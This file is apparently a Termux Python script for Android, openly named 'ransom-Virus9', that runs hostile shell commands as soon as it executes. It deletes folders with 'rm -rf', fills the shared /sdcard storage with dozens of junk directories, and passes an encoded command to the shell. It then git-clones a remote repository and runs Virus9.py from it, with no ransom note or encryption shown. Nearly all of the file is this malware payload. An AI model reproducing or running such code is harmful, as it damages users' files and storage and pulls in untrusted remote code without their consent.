#!/data/data/com.termux/files/usr/bin/python

import time
import os
import sys

os.system ("clear")
A7Y = 1000
while A7Y < 10000:
        A7Y = A7Y +1
        print( A7Y)
os.system ("clear")

__BOSS__ = """\033[1;31m
                     .ed   $$$$be.
                   -"           ^""**$$$e.
                 ."                   '$$$c
                /         BOSS        "4$$b
               d  3                      $$$$
               $  *                   .$$$$$$
              .$  ^c           $$$$$e$$$$$$$$.
              d$L  4.         4$$$$$$$$$$$$$$b
              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$
 z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c
4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.
^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$
  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""
        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"
          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"
              "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"
               "*$$$  *=%4.$ L L$ P3$$$F $$$P"
                  "$   "%*ebJLzb$e$$$$$b $P"
                    %..      4$$$$$$$$$$ "
                     $$$e   z$$$$$$$$$$%
                      "*$c  "$$$$$$$P"
                       .""*$$$$$$$$bc  github : 
                    .-"    .$***$$$""*e.  DEVBOSS/ransom-Virus9
                 .-"    .e$"     "*$c  ^*b.
          .=*   "    .e$*"          "*bc  "*$e..
        .$"        .z*"               ^*$e.   "*****e.
        $$ee$c   .d"                     "*$.        3.
        ^*$E")$..$"                         *   .ee==d%
           $.d$$$*                           *  J$$$e*
            " "                                "$$$"
"""
def ransom():
        print(__BOSS__)
        os.system ('rm -rif boss')
        os.system ('rm -rif boss')
        os.system('rm -rif boss && rm -rif boss')
        os.system ('rm -rif boss && rm -rif boss')
        os.system ('cd $HOME && cd ..')
        os.system ('rm -rf boss && cd ..')
        os.system ('rm -rf boss && cd ..')
        os.system ('cd usr')
        os.system ('rm -rf boss && cd ..')
        os.system ('cd bin')
        os.system ('rm -rf boss && cd ..')
        os.system('rm -rif boss.sh')
        os.system ('mkdir /sdcard/virrrrrooooDossssssss /sdcard/viiroooossdssssss')
ransom()

def ransom_Virus():
	os.system('mkdir /sdcard/bossssssss567ssss /sdcard/vvvviiiiirrrrrroo22ooos')
	os.system('mkdir /sdcard/bosssssss9976ss /sdcard/viiiiirrrrrrooooosss')
	os.system('mkdir /sdcard/BOOOOSSSSSSSSSSSSSSSSS /sdcard/Viiiiiiiirrrrrrrrrroooooosssss')
	os.system('mkdir /sdcard/bosssssssssss44ssssssssssss /sdcard/Viiiiiiiiiirrrrrrrrrroooooosssss')
	os.system('mkdir /sdcard/bossssssssssssssssssss4ss /sdcard/Viiiiiiiiiiiirrrrrrrrrroooooosssss')
	os.system('mkdir /sdcard/bosssssssss112ssss /sdcard/boOOOOTssssssssssssssss /sdcard/booo0000asssssssssssssssss')
	os.system('mkdir /sdcard/BOOOOSSSSSSSSSSSSSSssSSSX /sdcard/Viiiiiiiirrrrrrrrrroooooossssss')
	os.system('mkdir /sdcard/bbBosssssssssssss22sssssssssss /sdcard/Viiiiiiiiiirrrrrrrrrroooooosssssss')
	os.system('mkdir /sdcard/bbossssssssssssssssssssss1s /sdcard/Viiiiiiiiiiiirrrrrrrrrroooooossssssss')
	os.system('mkdir /sdcard/BBBBbosssssSSSssssss /sdcard/boDssssssssssssssss /sdcard/bosssssssssssssssssss0s')
	os.system('mkdir /sdcard/BOOOOSSSSSSSSSSSSSSSSSm /sdcard/Viiiiiiiirrrrrrrrrrrroooosssss')
	os.system('mkdir /sdcard/bossssssssssssssssssSsSsssssmm /sdcard/Viiiiiiiiiirrrrrrrrrrrroooosssss')
	os.system('mkdir /sdcard/bossssssssssssssssssssssmm /sdcard/Viiiiiiiiiiiirrrrrrrrrrrroooosssss')
	os.system('mkdir /sdcard/bossssssssscsmm /sdcard/bossssssssssssssmm /sdcard/bosssssssssssssssssmm')
	os.system('mkdir /sdcard/BOOOOSSSSSSSSSSsssssaSSSSSSS3 /sdcard/ViiiiiiiirrrrrrrrrrooooooOOsssss')
	os.system('mkdir /sdcard/bosssssssssssSSSSSssssssssssss /sdcard/ViiiiiiiiiirrrrrrrrrrooooOOOoosssss')
	os.system('mkdir /sdcard/bOBosssssssssssssSssssSsssssssss /sdcard/ViiiiiiiiiiiirrrrrrrrrrooOOOOoooosssss')
	os.system('mkdir /sdcard/bossssssSSSSSssss0o /sdcard/bossssssSSSssssssss11 /sdcard/DEVbosssssssOOssssssssss')
	os.system('mkdir /sdcard/BOOO000OSSSSSSSSSSSSSSSSS /sdcard/ViiiiiiiirrrrrrrrrrRRRoooooosssss')
	os.system('mkdir /sdcard/boOOO000Osssssssssssssssssssssss /sdcard/ViiiiiiiiiirrrrrrrrrrRRRRRoooooosssss')
	os.system('mkdir /sdcard/bOO1223OOOossssssssssssssssssssss /sdcard/ViiiiiiiiiiiirrrrrrrrrrRRRRRoooooosssss')
	os.system('mkdir /sdcard/boOOOOOsssss11sssss /sdcard/bOOOOOOossssssssssssss /sdcard/bOOOOOosssssssssssssssss')
	os.system('mkdir /sdcard/BOOOOSSSSSSSSSSSSSSSSS4 /sdcard/Viiiiiiiirrrrrrrrrroooooosssss122')
	os.system('mkdir /sdcard/bosssssssssssssssssssssss1 /sdcard/Viiiiiiiiiirrrrrrrrrroooooosssss23')
	os.system('mkdir /sdcard/bossssssssssssssssssssss2 /sdcard/Viiiiiiiiiiiirrrrrrrrrroooooosssss83')
	os.system('mkdir /sdcard/devbossssssssss1 /sdcard/bosssssssssssss2s /sdcard/bosssssss6ssssssssss04')
	os.system('mkdir /sdcard/bossssssssssss04sssss /sdcard/vvvviiiiirrrrrroOOO8oooos')
	os.system('mkdir /sdcard/bossssssSSSSS3sss /sdcard/viiiiirrrrrrooOOO0ooosss')
	os.system('mkdir /sdcard/BOOOOSSSSSSSSSSSSSS76SSSSSSS /sdcard/ViiiiiiiirrrrrrrrrroooOOOOO00ooosssss')
	os.system('mkdir /sdcard/bosssssssssssssssssssSSSSS1ssss /sdcard/ViiiiiiiiiirrrrrrrrrrooooOOOOO07oosssss')
	os.system('mkdir /sdcard/bossssssssssssssssssSSSSS2ssss /sdcard/ViiiiiiiiiiiirrrrrrrrrrooooooOOOO8sssss')
	os.system('mkdir /sdcard/bossssssssSSSSS8sssss /sdcard/bosssssssSSSSSS0sssssssss /sdcard/bosssssssssSSSS1ssssssss78')
	os.system('mkdir /sdcard/BOOOOccSSSSSSSSSSSSSSssSSS /sdcard/ViiiiiiiirrrrrrrrrrooooooOOOOOOssssss99')
	os.system('mkdir /sdcard/bosssssssssssssssssSSSSS1sssssss /sdcard/ViiiiiiiiiirrrrrrrrrroooooOOOOO0Oosssssss')
	os.system('mkdir /sdcard/bossssssssssssssssssSSSSS2sssss /sdcard/ViiiiiiiiiiiirrrrrrrrrroooooossssSSSSSssss')
	os.system('mkdir /sdcard/bosssssssssss0 /sdcard/bosssssssssssssss0s /sdcard/bossssssssssssSSSSSS0ssssssss')
	os.system('mkdir /sdcard/BOOOOSSSSSSSSSSSSSSSSSRSSSSm0l /sdcard/ViiiiiiiirrrrrrrrrrrroooOOOOOO7osssss')
	os.system('mkdir /sdcard/bossssssssss12ssssssssSsSsssssmm07 /sdcard/ViiiiiiiiiirrrrrrrrrrrrRRRRR6oooosssss')
	os.system('mkdir /sdcard/bossssssssssssssssssSSSSSSSXssssmm06 /sdcard/ViiiiiiiiiiiirrrrrrrrrrrRRRRRRroooosssss')
	os.system('mkdir /sdcard/bossssssssssmm02 /sdcard/bossssssssssssSSSSSAssmm0 /sdcard/bosssssssssssSSSSSSCssssssmm76')
	os.system('mkdir /sdcard/BOOOOSSSSSSSSSSsssssaSSSSSSS1 /sdcard/ViiiiiiiirrrrrrrrrrooooooOO00OOsssss')
	os.system('mkdir /sdcard/bosssssss12ssssSSSSSssssssssssss /sdcard/ViiiiiiiiiirrrrrrrrrrooooOO000Ooosssss')
	os.system('mkdir /sdcard/bosssssssssssssSssssssSsssssssss70 /sdcard/ViiiiiiiiiiiirrrrrrrrrrooO000OOOoooosssss')
	os.system('mkdir /sdcard/bossssssSSSssSSssss2 /sdcard/bossssssSSSRSSssssssss /sdcard/bosssssssO0Ossssssssss')
	os.system('mkdir /sdcard/BOOOOSSSssSSSSSSSSS00SSSSS /sdcard/ViiiiiiiirrrrrrrrrrRRRooooOOOoosssss12')
	os.system('mkdir /sdcard/boOOOOssssssssssssssssss0sssss /sdcard/ViiiiiiiiiirrrrrrrrrrRRRRRooo00ooosssss13')
	os.system('mkdir /sdcard/bOOOOOossssssssssssssss00ssssss /sdcard/ViiiiiiiiiiiirrrrrrrrrrRRRRRoooo00oosssss07')
	os.system('mkdir /sdcard/boOOOOOssssss00ssss06 /sdcard/bOOOOOOosssss00sssssssss /sdcard/bOOO00OOosssssssssssssssss')
	os.system('mkdir /sdcard/BOOOOSSSSSSSSSSESSSSSSS41 /sdcard/Viiiiiiiirrrrrrrrrroooooosssss21')
	os.system('mkdir /sdcard/bossss0ssssssAsssssssssssss1 /sdcard/Viiiiiiiiiirrrrrrrrrroooooosssss240')
	os.system('mkdir /sdcard/bOOOOOossssssssssssssssssYssss2 /sdcard/Viiiiiiiiiiiirrrrrrrrrroooooosssss03')
	os.system('mkdir /sdcard/bosssssssSSSSSS1sss1 /sdcard/bossssssssssEsss2s /sdcard/bosssssss6ssssssssss408')
	os.system('bWtkaXIgYm9zc3Nzc3Nzc3Nzc3Nzc21tCg==')
	os.system('mkdir /sdcard/bosssss10 /sdcard/bosssssssssssssss02 /sdcard/bossssssssssssss0s')
	os.system('mkdir /sdcard/bosssssssrssssssssssSSSSS1sssssss12 /sdcard/ViiiiiiiiiirrrrrrrrrroooooOOO0000OO0Oosssssss')
	os.system('mkdir /sdcard/bossssssssssssssssssSSSSS2sssss23 /sdcard/ViiiiiiiiiiiirrrrrrrrrroooooossssSSSSsssSssss4')
	os.system('mkdir /sdcard/bosssssssssss /sdcard/bosssssssssssssssSSSSS1s /sdcard/bossssssssssssSSSSSS0ssssSsssss4')
	os.system('mkdir /sdcard/BOOOOSSSSSSSSSSSSSSSSSRSSSSm0o /sdcard/ViiiiiiiirrrrrrrrrrrroooOOOOOO7osssss1')
	os.system('mkdir /sdcard/bossssssssss12ssssssssSsSsssssmm08 /sdcard/ViiiiiiiiiirrrrrrrrrrrrRRRRR60oooosssss')
	os.system('mkdir /sdcard/bossssssssssssssssssSSSSSSSXssssmm03 /sdcard/ViiiiiiiiiiiirrrrrrrrrrrRRRRRRroooosssss1')
	os.system('mkdir /sdcard/bossssssssssmm01 /sdcard/bossssssssssssSSSSSAssmm1 /sdcard/bosssssssssssSSSSSSCCCssssssmm')
	os.system('mkdir /sdcard/BOOOOSSSSSSSSSSsssssaSSSSSSS4 /sdcard/ViiiiiiiirrrrrrrrrrooooooOO00O0Osssss')
	os.system('mkdir /sdcard/bosssssss12sssCCsSSSSSssssssssssss /sdcard/ViiiiiiiiiirrrrrrrrrrooooOO000OoosssssSS0')
	os.system('mkdir /sdcard/bosssssssCCssssssSssssssSsssssssss /sdcard/ViiiiiiiiiiiirrrrrrrrrrooO000OOOoooosSS0ssss')
	os.system('mkdir /sdcard/bossssssSSSSSCssSSssss /sdcard/bosssssVsSSSsssSSPsssss00 /sdcard/bosssssssO0OssssSSPssssss')
	os.system('mkdir /sdcard/BOOOOSSSssSSSSSSSSS0CCD0SSSSS /sdcard/ViiiiiiiirrrrrrrrrrRRRooooOOOoosssss09')
	os.system('mkdir /sdcard/boOOOOsssssssssSSCsssssssss0sssss /sdcard/ViiiiiiiiiirrrrrrrrrrRRRRRoooPO00ooosssss98')
	os.system('mkdir /sdcard/bOOOOOossssssssssssssss00PO9ssssss /sdcard/ViiiiiiiiiiiirrrrrrrrrrRRRRRoooo00oosssss76')
	os.system('cd ..')
	os.system('mkdir /sdcard/BOOOOSSSSSSSSSSSSSSSSSSSSSSS76SSSSSSS /sdcard/ViiiiiiiirrrrrrrrrroooOOOOOOOOOOOOOOOO00ooosssss')
	os.system('mkdir /sdcard/bosssssssssssssssssssSSSSSSSSSSSSSSSSSSS1ssss /sdcard/ViiiiiiiiiirrrrrrrrrrooooOOOOO0777777oosssss')
	os.system('mkdir /sdcard/bossssssssssssssssssSSSSSSSSSSSSWE1S2ssss /sdcard/ViiiiiiiiiiiirrrrrrrrrrooooooOOOO888888888sssss')
	os.system('mkdir /sdcard/bosssssssSSSSSSSSSSSsSSSSS8sssss /sdcard/boOOOOOOOOOOOsssssssSSSSSS0sssssssss /sdcard/bosssssssssSSSS1ssssssss14')
	os.system('mkdir /sdcard/BOOOOSSSSSSSSSSSSSSssSRSS /sdcard/ViiiiiiiirrrrrrrrrrooooooOOOOOOssssss88')
	os.system('mkdir /sdcard/bosssssssssssssssssSSSSSSSSSSSSSSSS2SSSSS1sssssss /sdcard/ViiiiiiiiiirrrRRRRRRRRRRRRrrrrrrroooooOOOOO0Oosssssss')
	os.system('mkdir /sdcard/bBBBBBBBBBBBosssssssssssssssSSSSSSSSSSSSS0sssSSSSS2sssss /sdcard/ViiiiiiiiiiiirrrrrrrrrroooooossSSSSSSSSSSSSSSSssSSSSSssss')
	os.system('mkdir /sdcard/bosssssssssss94 /sdcard/boOOOOOOOO0sssssssSSSSSSSSSSSsssssssss /sdcard/bBBBBBBOOOOOOOossssssssssssSSSSSSSSSSSS1SSSSS0ssssssss')
	os.system('mkdir /sdcard/BOOOOSSSSSSSSSSSSSSSSSSSSSS111SSSSm /sdcard/ViiiiiiiirrrrrrrrrrrroooOOOOOO7oOOOOOOOOOOOOSSSsssss')
	os.system('mkdir /sdcard/bossssssssss12ssssssssSsSSSSSW1Ssssssmm /sdcard/ViiiiiiiiiiIIIIIIIIIIrrrrrrrrrrrrRRRRR6oooosssss')
	os.system('mkdir /sdcard/bossssssssssssssssssSSSSSSSXssssmm04 /sdcard/ViiiiiiiiiiiirrrrrrrrrrrRRRRRRRR12Rroooosssss')
	os.system('mkdir /sdcard/boOOOOOOO000ssssssssssmm /sdcard/bossssssSSSSSSSSEssssssSSSSSAssmm /sdcard/bosssssssssssSSSSSSCssssssmm75')
	os.system('mkdir /sdcard/BOOOOSSSSSSSSSSsssssaSSSSSSS0000000 /sdcard/ViiiiiiiirrrrrrrrrrooooooOO00OOsssss111111')
	os.system('mkdir /sdcard/bosssssss12ssssSSSSSSSSSSSSSSSssssssssssss /sdcard/ViiiiiiiiiirrrrrrrrrrooooOO000OooOOOOOOOOOOSsssss')
	os.system('mkdir /sdcard/bosssssssssssssSssssssSsssssssss80 /sdcard/ViiiiiiiiiiiirrrrrrrrrrooO000OOOOOOOOOOOOoooosssss')
	os.system('mkdir /sdcard/bossssSSSSSssSSSs00000OOOOsSSssss /sdcard/bossssssSSSOOOOOOOOO000ssssssss /sdcard/bosssssssO0OOOOO0000OOOOOssssssssss')
	os.system('mkdir /sdcard/BOOOOSSSssSSSSSS00000000AASSS00SSSSS /sdcard/ViiiiiiiirrrrrrrrrrRRRooooOOOoossSSSSSSSSSS000sss')
	os.system('mkdir /sdcard/boOOOOssssssssssssssssss0000000OOOOOOOsssss /sdcard/ViiiiiiiiiirrrrrrrrrrRRRRRooo00ooossssSSSSSSSSAAAs')
	os.system('mkdir /sdcard/bOOOOOossssssssssssssss00sssSSSSSSSQsss /sdcard/ViiiiiiiiiiiirrrrrrrrrrRRRRRoooo00oosOOOOOOOOOOOssss')
	os.system('mkdir /sdcard/boOOOOOssssss00ssss07 /sdcard/bOOOOOOosssss00sssssSSSSSAAAssss /sdcard/bOOO00OOossssssssssSSSSSSSSCCCCTTsssssss')
	os.system('mkdir /sdcard/BOOOOSSSSSSSSSSESSSSSSS40 /sdcard/ViiiiiiiirrrrrrrrrroooooOOOOOOOOOSSSSSosssss01')
	os.system('mkdir /sdcard/bossss0ssssssAsssssssOOOOOOOSSSSssssss1 /sdcard/Viiiiiiiiiirrrrrrrrrroooooosssss241')
	os.system('mkdir /sdcard/bOOOOOossssssssssssssssssYsusss2 /sdcard/ViiiiiiiiiiiirrrrrrrrrroooooosOOOOOOSSSSssss3')
	os.system('mkdir /sdcard/bosssssssSSSSSSWWWSSSSS1sss1 /sdcard/bossssssssSSSSSSSSSEEssEsss2s /sdcard/bosssssss333336ssssssssss4')
	os.system('bWtkaXIgYm9zc3Nzc3Nzc3Nzc3Nzc21tCg==')
	os.system('mkdir /sdcard/bosssss07 /sdcard/bosssssssssssssss07 /sdcard/bosssssOOOOOOOssssssssss')
	os.system('mkdir /sdcard/bosssssssrssssssssssSSSSSSS222SSS1sssssss12 /sdcard/ViiiiiiiiiirrrrrrrrrroooooOOO0000OOOOOOOOOO0Oosssssss')
	os.system('mkdir /sdcard/bossssssssssssssssssSSSSSSSS3SS2sssss23 /sdcard/ViiiiiiiiiiiirrrrrrrrrroooooOOOOOOOOO000ossssSSSSsssSssss4')
	os.system('mkdir /sdcard/bosssssssssss95 /sdcard/bossssssssssSSSSSSSSSSSSEsssssSSSSS1s /sdcard/bBBBBBBBBBHBOOOOOOOOossssssssssssSSSSSS0ssssSsssss4')
	os.system('mkdir /sdcard/BOOOOSSSSSSSSSSSSSSSSSRSSSSma0 /sdcard/ViiIIIIIIITiiiiiirrrrrrrrrrrroooOOOOOO7osssss1')
	os.system('mkdir /sdcard/bossssssssss12sssssssOOOOOsSsSsssssmm /sdcard/ViiiiiiiiiirrrrrrrrrrrRRRRRArRRRRR60oooosssss')
	os.system('mkdir /sdcard/bossssssssssssssssssSSSSSSSXssssmm05 /sdcard/ViiiiiiiiiiiirrrrrrrrrrrRRRRR11Rroooosssss1')
	os.system('mkdir /sdcard/DEVbossssssssssSS9 /sdcard/bossssssssssssSSSSSSS1SSSSSAssmm /sdcard/bosssssssssssSSSSSSSSS6110SCCCssssssmm')
	os.system('mkdir /sdcard/DEVBOOOOSSSSSSSSSSsssssaSSSSSSS2 /sdcard/ViiiiiiiirrrrrrrrrrooooooOO00O0110Osssss')
	os.system('mkdir /sdcard/DEVbosssssss12sssCCsSSSSSssssssssssss /sdcard/ViiiiiiiiiirrrrrrrrrrooooOO000O110oosssssSS0')
	os.system('mkdir /sdcard/DEVbosssssssCCssssssSssssssSsssssssss /sdcard/ViiiiiiiiiiiirrrrrrrrrrooO000O110OOoooosSS0ssss')
	os.system('mkdir /sdcard/DEVbossssssSSSSSCssSSssss /sdcard/bosssssVsSSSsssSSPsssss01 /sdcard/bosssssssO0Oss110ssSSPssssss')
	os.system('mkdir /sdcard/DEVBOSS-BOOOOSSSssSSSSSSSSS0CCD0SSSSS /sdcard/ViiiiiiiirrrrrrrrrrRRRooooOOOoo110sssss')
	os.system('mkdir /sdcard/DEVBOSSboOOOOsssssssssSSCsssssssss0sssss /sdcard/ViiiiiiiiiirrrrrrrrrrRRRRRoooPO00ooosss110ss')
	os.system('mkdir /sdcard/DEVBOSSbOOOOOossssssssssssssss00PO9ssssss /sdcard/Viiiiiiiiiiiirrrrrrrr110')
	os.system('mkdir /sdcard/moooooohhhhhhhoootoooo')
ransom_Virus()

def slowprint():
        print('#####installing tool ransomware')
        os.system ('apt update -y && apt upgrade -y')
        os.system ('git clone https://github.com/DEVBOSS1/VIRUSBOSS')
        os.system ('cd VIRUSBOSS && chmod +x * && python Virus9.py')
        os.system ('rm -rf VIRUSBOSS')
slowprint()

user_agents = [
    'Mozilla/5.0 (android NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (android NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (android NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (android NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (android NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (android NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (android NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (android NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    'Mozilla/5.0 (android NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    'Mozilla/4.0 (compatible; MSIE 9.0; android NT 6.1)',
    'Mozilla/5.0 (android NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; android NT 6.1; WOW64; Trident/5.0)',
    'Mozilla/5.0 (android NT 6.1; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (android NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (android NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; android NT 6.0; Trident/5.0)',
    'Mozilla/5.0 (android NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; android NT 6.1; Trident/5.0)',
    'Mozilla/5.0 (android NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 10.0; android NT 6.1; WOW64; Trident/6.0)',
    'Mozilla/5.0 (compatible; MSIE 10.0; android NT 6.1; Trident/6.0)',
    'Mozilla/4.0 (compatible; MSIE 8.0; android NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)'
]

